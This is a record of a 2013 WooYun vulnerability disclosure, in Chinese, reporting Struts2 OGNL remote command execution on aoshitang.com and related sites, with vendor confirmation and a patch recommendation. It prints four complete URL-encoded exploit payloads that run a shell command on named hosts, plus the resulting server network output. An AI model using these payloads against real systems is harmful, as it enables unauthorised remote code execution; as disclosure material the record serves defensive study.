{"id": 10199, "wybug_id": "wooyun-2013-028965", "wybug_title": "傲世堂主站+多个分站远程命令执行漏洞", "wybug_corp": "傲世堂", "wybug_author": "猪猪侠", "wybug_date": "2013-07-15 16:12", "wybug_open_date": "2013-08-29 16:13", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方框架", "远程代码执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-07-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-07-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-08-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-08-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-08-29：\t细节向公众公开  简要描述： 远程命令执行，都是同一个类型的，严重影响用户数据，一起修补了吧。 详细说明：  http://www.aoshitang.com/login.action?class.classLoader.jarPath=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess[%22allowStaticMethodAccess%22]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27/sbin/ifconfig%20-a%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23s3cur1ty%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23s3cur1ty.println%28%23d%29%2c%23s3cur1ty.close%28%29%29%28aa%29&x[%28class.classLoader.jarPath%29%28%27aa%27%29]http://as.aoshitang.com/validatecode.xhtml?class.classLoader.jarPath=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess[%22allowStaticMethodAccess%22]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27/sbin/ifconfig%20-a%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23s3cur1ty%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23s3cur1ty.println%28%23d%29%2c%23s3cur1ty.close%28%29%29%28aa%29&x[%28class.classLoader.jarPath%29%28%27aa%27%29]http://www.zzsf.com/validatecode.xhtml?class.classLoader.jarPath=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess[%22allowStaticMethodAccess%22]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27/sbin/ifconfig%20-a%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23s3cur1ty%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23s3cur1ty.println%28%23d%29%2c%23s3cur1ty.close%28%29%29%28aa%29&x[%28class.classLoader.jarPath%29%28%27aa%27%29]http://mj.aoshitang.com/validatecode.xhtml?class.classLoader.jarPath=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess[%22allowStaticMethodAccess%22]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27/sbin/ifconfig%20-a%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23s3cur1ty%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23s3cur1ty.println%28%23d%29%2c%23s3cur1ty.close%28%29%29%28aa%29&x[%28class.classLoader.jarPath%29%28%27aa%27%29]   漏洞证明：  \neth0      Link encap:Ethernet  HWaddr 90:B1:1C:15:9A:84            inet addr:10.6.196.53  Bcast:10.6.196.255  Mask:255.255.255.0          inet6 addr: fe80::92b1:1cff:fe15:9a84/64 Scope:Link          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:4756499879 errors:0 dropped:0 overruns:0 frame:0          TX packets:4862128508 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:945609290742 (880.6 GiB)  TX bytes:2442428945970 (2.2 TiB)          Interrupt:82 Memory:da000000-da012800 eth1      Link encap:Ethernet  HWaddr 90:B1:1C:15:9A:85            inet6 addr: fe80::92b1:1cff:fe15:9a85/64 Scope:Link          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:2387083 errors:0 dropped:0 overruns:0 frame:0          TX packets:6 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:152773312 (145.6 MiB)  TX bytes:492 (492.0 b)          Interrupt:90 Memory:dc000000-dc012800 lo        Link encap:Local Loopback            inet addr:127.0.0.1  Mask:255.0.0.0          inet6 addr: ::1/128 Scope:Host          UP LOOPBACK RUNNING  MTU:16436  Metric:1          RX packets:140885039 errors:0 dropped:0 overruns:0 frame:0          TX packets:140885039 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0           RX bytes:58590721603 (54.5 GiB)  TX bytes:58590721603 (54.5 GiB)sit0      Link encap:IPv6-in-IPv4            NOARP  MTU:1480  Metric:1          RX packets:0 errors:0 dropped:0 overruns:0 frame:0          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0           RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)\n   修复方案：  升级最新的第三方框架，然后全面检查类似架构的站点。   版权声明：转载请注明来源 猪猪侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-07-15 16:27 厂商回复： 谢谢猪猪侠！！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}